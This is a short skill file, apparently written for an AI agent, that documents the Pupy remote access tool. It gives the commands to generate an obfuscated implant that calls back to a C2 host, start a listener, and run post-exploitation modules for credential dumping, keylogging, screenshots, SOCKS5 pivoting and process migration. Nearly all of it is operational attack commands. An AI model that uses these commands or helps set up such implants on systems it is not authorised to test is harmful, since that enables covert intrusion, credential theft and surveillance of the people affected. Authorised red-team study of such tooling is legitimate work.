---
name: pupy
description: >
  This skill should be used when the user asks about "pupy", "needing a
  lightweight RAT with in-memory modules, multiple transports
  (TCP/HTTP/WebSocket), and migration capabilities". Cross-platform remote
  administration and post-exploitation tool with Python implants.
---

# Pupy

Cross-platform Python RAT with in-memory module loading and multiple C2 transports.

## Quick Start

```bash
# Docker (recommended)
docker pull n1nj4sec/pupy
docker run -it --rm -p 8443:8443 n1nj4sec/pupy pupysh

# Generate implant
gen -f exe -t obfs3 connect --host C2:8443 -o agent.exe

# Start listener
listen -a obfs3 8443
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `sessions` | List active sessions |
| `interact <id>` | Enter session |
| `run <module>` | Run a post-ex module |
| `gen` | Generate implant |
| `listen` | Start listener |
| `upload/download` | File transfer |

## Common Modules

```bash
run post.gather.credentials   # Dump creds
run post.gather.keylogger     # Start keylogger
run post.gather.screenshot    # Screenshot
run post.pivot.socks5         # SOCKS5 proxy
run post.migrate              # Process migration
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Transport config and module index |
